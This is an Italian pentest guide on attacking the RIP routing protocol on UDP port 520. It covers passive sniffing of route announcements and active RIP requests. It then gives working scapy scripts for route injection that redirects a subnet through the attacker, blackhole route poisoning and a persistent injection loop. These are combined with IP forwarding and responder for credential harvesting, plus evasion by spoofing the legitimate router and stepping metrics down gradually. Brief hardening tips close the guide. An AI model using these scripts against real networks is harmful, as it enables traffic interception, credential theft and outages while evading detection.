---
title: 'Porta 520 RIP: sniffing delle rotte, route injection e rischio MitM su reti legacy'
slug: porta-520-rip
description: 'Scopri cos’è la porta 520/UDP usata da RIP, come funzionano RIPv1 e RIPv2 e perché gli annunci di routing possono esporre la topologia di rete e aumentare il rischio di route poisoning, traffic redirect e manipolazione del percorso.'
image: /porta-520-rip.webp
draft: true
date: 2026-04-05T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - route-poisoning
  - mitm-routing
---

> **Executive Summary** — La porta 520 RIP espone il Routing Information Protocol, un protocollo di routing dinamico senza autenticazione nativa. RIP annuncia le rotte via broadcast/multicast UDP: chiunque sulla rete può catturarle per mappare la topologia e iniettarne di false per redirigere traffico. Questa guida copre sniffing delle rotte, route injection e MitM tramite manipolazione routing.

* RIP trasmette rotte in broadcast senza auth — qualsiasi host le riceve e può iniettarne di false
* Un solo pacchetto RIP Response crafted redirige il traffico di un'intera subnet attraverso il tuo host
* RIP è ancora attivo su reti SOHO, legacy e OT dove OSPF/BGP sono troppo complessi

Porta 520 RIP è il canale UDP su cui i router scambiano tabelle di routing con il Routing Information Protocol. La porta 520 vulnerabilità principale è l'assenza totale di autenticazione in RIPv1 e la debolezza dell'auth MD5 opzionale in RIPv2. L'enumerazione porta 520 è completamente passiva: basta ascoltare i broadcast per ottenere la mappa delle subnet. Un RIP pentest sfrutta la fiducia cieca dei router nei pacchetti ricevuti — inietti una rotta con metric migliore e il traffico viene rediretto. Nella kill chain, porta 520 si posiziona tra recon (topology mapping) e initial access (MitM per credential capture).

## 1. Anatomia Tecnica della Porta 520

La porta 520 è registrata IANA come `router` su protocollo UDP. RIP usa broadcast (v1) o multicast 224.0.0.9 (v2) per annunciare rotte ogni 30 secondi.

Flusso RIP:

1. Ogni 30 secondi il router invia un **RIP Response** con tutte le rotte (max 25 entry per pacchetto)
2. I router vicini aggiornano le tabelle se la metric è migliore (1-15, dove 16 = unreachable)
3. Senza riconferma entro 180 secondi, la rotta viene marcata unreachable
4. Garbage collection dopo ulteriori 120 secondi

Varianti: RIPv1 (broadcast, no auth, classful), RIPv2 (multicast, auth MD5 opzionale, classless), RIPng (IPv6, porta 521).

```
Misconfig: RIPv1 senza migrazione a v2 con MD5
Impatto: qualsiasi host riceve e inietta rotte — zero verifica dell'origine
Come si verifica: sudo tcpdump -i eth0 udp port 520 -vvv
```

```
Misconfig: RIPv2 senza autenticazione configurata
Impatto: identico a v1 — annunci accettati senza verifica
Come si verifica: tshark -Y "rip.auth.type" — assenza = no auth
```

```
Misconfig: RIP attivo su VLAN utenti o management
Impatto: host compromessi sulla VLAN possono manipolare il routing
Come si verifica: sniffing per presenza annunci RIP su interfacce non-router
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sU -p 520 --reason 10.10.10.0/24
```

**Output atteso:**

```
PORT    STATE         SERVICE REASON
520/udp open          route   udp-response
520/udp open|filtered route   no-response
```

**Parametri:**

* `-sU`: scan UDP obbligatorio
* `-p 520`: porta routing RIP
* `--reason`: distingue open da filtered su UDP

### Comando 2: Sniffing passivo

```bash
sudo tcpdump -i eth0 udp port 520 -vvv -c 10
```

**Output atteso:**

```
14:30:00.123 IP 10.10.10.1.520 > 224.0.0.9.520: RIPv2, Response, length: 84
  RTE #1: 192.168.1.0/24, metric 1, next-hop self
  RTE #2: 192.168.2.0/24, metric 2, next-hop 10.10.10.2
  RTE #3: 10.20.0.0/16, metric 3, next-hop 10.10.10.2
```

**Cosa ci dice questo output:** router 10.10.10.1 annuncia tre subnet via RIPv2 multicast. `192.168.1.0/24` è direttamente connessa (metric 1). `10.20.0.0/16` è a 3 hop, probabilmente un datacenter. Nessun campo auth visibile — injection diretta possibile.

## 3. Enumerazione Avanzata

### Cattura e parsing completo

```bash
sudo tcpdump -i eth0 udp port 520 -w rip.pcap -c 100
tshark -r rip.pcap -Y "rip" -T fields -e ip.src -e rip.ip -e rip.netmask -e rip.metric | sort -u
```

**Output:**

```
10.10.10.1	192.168.1.0	255.255.255.0	1
10.10.10.1	192.168.2.0	255.255.255.0	2
10.10.10.1	10.20.0.0	255.255.0.0	3
10.10.10.2	172.16.0.0	255.255.0.0	1
10.10.10.2	192.168.1.0	255.255.255.0	2
```

**Lettura dell'output:** due router, 4 subnet totali. Il .2 ha accesso diretto a 172.16.0.0/16 — la /16 suggerisce un segmento grande (datacenter, OT). Correla con la [guida all'enumerazione di rete](https://hackita.it/articoli/enumeration) per completare la mappa.

### RIP Request attivo

```bash
python3 -c "
from scapy.all import *
from scapy.contrib.rip import *
pkt = IP(dst='10.10.10.1')/UDP(sport=520,dport=520)/RIP(cmd=1)/RIPEntry(addr='0.0.0.0')
ans = sr1(pkt, timeout=5, verbose=0)
if ans:
    for e in ans[RIP]:
        if hasattr(e,'addr'): print(f'{e.addr}/{e.mask} metric={e.metric}')
"
```

**Output:**

```
192.168.1.0/255.255.255.0 metric=1
192.168.2.0/255.255.255.0 metric=2
10.20.0.0/255.255.0.0 metric=3
```

**Lettura dell'output:** request con addr 0.0.0.0 forza il router a inviare la tabella completa immediatamente — non devi aspettare il ciclo di 30 secondi. Approfondisci l'uso di scapy per il [fingerprint avanzato](https://hackita.it/articoli/nmap).

## 4. Tecniche Offensive

**Route injection per traffic redirect**

Contesto: RIP senza auth. Inietti una rotta con metric 1 per redirigere traffico.

```bash
python3 -c "
from scapy.all import *
from scapy.contrib.rip import *
pkt = IP(src='10.10.10.200',dst='224.0.0.9')/UDP(sport=520,dport=520)/RIP(cmd=2)/RIPEntry(addr='192.168.1.0',mask='255.255.255.0',metric=1,nextHop='10.10.10.200')
send(pkt, verbose=0)
print('[+] Rotta iniettata: 192.168.1.0/24 via 10.10.10.200 metric 1')
"
```

**Output (successo):**

```
[+] Rotta iniettata: 192.168.1.0/24 via 10.10.10.200 metric 1
```

**Cosa fai dopo:** attiva forwarding (`sysctl -w net.ipv4.ip_forward=1`), poi cattura il traffico con `tcpdump -A net 192.168.1.0/24`. Per il credential harvesting, usa le [tecniche MitM](https://hackita.it/articoli/mitm).

**Route poisoning (blackhole)**

```bash
python3 -c "
from scapy.all import *; from scapy.contrib.rip import *
send(IP(dst='224.0.0.9')/UDP(sport=520,dport=520)/RIP(cmd=2)/RIPEntry(addr='192.168.2.0',mask='255.255.255.0',metric=16),count=3,inter=1,verbose=0)
print('[+] Route poisoned: 192.168.2.0/24 unreachable')
"
```

**Cosa fai dopo:** la subnet diventa irraggiungibile. Diversione efficace durante operazioni su altri segmenti.

**Persistent injection (loop)**

```bash
python3 -c "
import time; from scapy.all import *; from scapy.contrib.rip import *
pkt = IP(dst='224.0.0.9')/UDP(sport=520,dport=520)/RIP(cmd=2)/RIPEntry(addr='192.168.1.0',mask='255.255.255.0',metric=1)
while True: send(pkt,verbose=0); time.sleep(25)
"
```

**Cosa fai dopo:** rotta mantenuta attiva — il timer di 25 secondi batte il ciclo standard di 30. Combina con `responder` per [cattura hash NTLM](https://hackita.it/articoli/passwordspray).

## 5. Scenari Pratici di Pentest

### Scenario 1: SOHO network con RIPv1

**Situazione:** piccola azienda con router consumer. RIPv1 attivo per default. Hai compromesso un host.

**Step 1:**

```bash
sudo tcpdump -i eth0 udp port 520 -vvv -c 5
```

**Output atteso:** annunci RIPv1 broadcast senza auth.

**Step 2:**

```bash
sysctl -w net.ipv4.ip_forward=1 && python3 inject.py
```

**Se fallisce:**

* Causa probabile: router SOHO potrebbe non accettare RIP da sorgenti non note
* Fix: spoof l'IP di un host trusted (es. altro router) come sorgente

**Tempo stimato:** 5-10 minuti

### Scenario 2: Enterprise legacy con RIPv2 no-auth

**Situazione:** rete enterprise con RIPv2 senza MD5. VLAN di management accessibile.

**Step 1:**

```bash
tshark -i eth0 -f "udp port 520" -T fields -e ip.src -e rip.ip -e rip.metric -c 30
```

**Step 2:** injection verso la subnet finance (192.168.2.0/24) con metric 1.

**Se fallisce:**

* Causa probabile: `passive-interface` sulla VLAN management
* Fix: se non ricevi annunci RIP, il router non li processa sulla tua VLAN — cambia segmento

**Tempo stimato:** 10-20 minuti

### Scenario 3: OT/ICS con RIP tra zone

**Situazione:** RIP tra zona IT e OT. Recon passivo per documentare la vulnerabilità.

**Step 1:**

```bash
sudo tcpdump -i eth0 udp port 520 -vvv | grep -E "192\.168\.100|10\.0\.1"
```

**Step 2:** documentare la possibilità di injection senza eseguirla (ambienti OT = no injection attivo).

**Tempo stimato:** 5-10 minuti recon passivo

## 6. Attack Chain Completa

| Fase    | Tool              | Comando chiave                      | Output/Risultato  |
| ------- | ----------------- | ----------------------------------- | ----------------- |
| Recon   | tcpdump           | `tcpdump -i eth0 udp port 520 -vvv` | Mappa rotte       |
| Inject  | scapy             | RIPEntry con metric 1               | Rotta iniettata   |
| Forward | sysctl            | `net.ipv4.ip_forward=1`             | Traffico transita |
| MitM    | tcpdump/responder | `responder -I eth0`                 | Credenziali       |

**Timeline:** 10-30 minuti. Convergenza RIP: 30-180 secondi dopo injection.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* Log router: rotte aggiunte/cambiate da sorgenti sconosciute
* IDS: regole per RIP update anomali
* Baseline routing: entry inattese

### Tecniche di Evasion

```
Tecnica: IP spoofing del router legittimo
Come: src IP del router reale nel pacchetto scapy
Riduzione rumore: annuncio indistinguibile dal legittimo
```

```
Tecnica: Metric incrementale
Come: metric 3 → 2 → 1 su più cicli (simula convergenza)
Riduzione rumore: meno sospetto di un salto a metric 1
```

### Cleanup

* Stop injection → rotte scadono in 300 secondi (180 timeout + 120 garbage)
* Fast cleanup: annuncia metric 16 per la rotta iniettata

## 8. Toolchain e Confronto

| Aspetto   | RIP (520/UDP)      | OSPF (proto 89)   | BGP (179/TCP)      |
| --------- | ------------------ | ----------------- | ------------------ |
| Auth      | None (v1)/MD5 (v2) | MD5/SHA           | MD5, GTSM          |
| Injection | Triviale (1 pkt)   | Media (adjacency) | Alta (TCP session) |
| Scope     | SOHO/legacy        | Enterprise        | Inter-AS           |
| Max hop   | 15                 | Illimitato        | Illimitato         |

## 9. Troubleshooting

| Errore / Sintomo                  | Causa                    | Fix                                                                   |
| --------------------------------- | ------------------------ | --------------------------------------------------------------------- |
| Nessun RIP su tcpdump             | OSPF/EIGRP in uso        | `tcpdump ip proto 89` per OSPF                                        |
| Injection non accettata           | Auth MD5 attiva          | Cattura hash, [crack offline](https://hackita.it/articoli/bruteforce) |
| Scapy non invia multicast         | Rotta multicast mancante | `ip route add 224.0.0.0/4 dev eth0`                                   |
| Traffico non arriva dopo redirect | IP forwarding off        | `sysctl -w net.ipv4.ip_forward=1`                                     |

## 10. FAQ

**D: Come intercettare le rotte RIP sulla porta 520?**
R: `sudo tcpdump -i eth0 udp port 520 -vvv` — gli annunci RIP arrivano ogni 30 secondi in broadcast/multicast. Completamente passivo.

**D: Porta 520 è TCP o UDP?**
R: Esclusivamente UDP. RIP è connectionless.

**D: RIP è ancora usato nel 2026?**
R: Sì, in reti SOHO, legacy e OT/ICS dove la semplicità prevale.

**D: Come proteggere la porta 520?**
R: MD5 auth su RIPv2, `passive-interface default`, filtraggio route. Meglio: migra a OSPF.

## 11. Cheat Sheet Finale

| Azione             | Comando                                                | Note            |
| ------------------ | ------------------------------------------------------ | --------------- |
| Sniff rotte        | `sudo tcpdump -i eth0 udp port 520 -vvv`               | Passivo         |
| Estrai subnet      | `tshark -r rip.pcap -T fields -e rip.ip -e rip.metric` | Parsing offline |
| Verifica auth      | `tshark -Y "rip.auth.type"`                            | Vuoto = no auth |
| Route inject       | Script scapy metric 1 (sez. 4)                         | Redirect        |
| Route poison       | Script scapy metric 16                                 | Blackhole       |
| Forwarding on      | `sysctl -w net.ipv4.ip_forward=1`                      | Per MitM        |
| RIP Request        | Script scapy cmd=1 (sez. 3)                            | Forza dump      |
| Credential harvest | `responder -I eth0`                                    | Post-redirect   |

### Hardening

* MD5 auth RIPv2: `ip rip authentication mode md5` + key chain
* `passive-interface default` — RIP solo dove serve
* Migra a OSPF per reti >3 router

### OPSEC

Sniffing = invisibile. Injection genera UDP/520 rilevabile. IP spoofing del router + metric graduale riduce rischio.

***

Riferimento: RFC 2453 (RIPv2), RFC 1058 (RIPv1). Uso esclusivo in ambienti autorizzati. [https://www.speedguide.net/port.php?port=520](https://www.speedguide.net/port.php?port=520)

> [hackita.it/supporto](https://hackita.it/supporto) per donazioni · [hackita.it/servizi](https://hackita.it/servizi) per formazione 1:1.
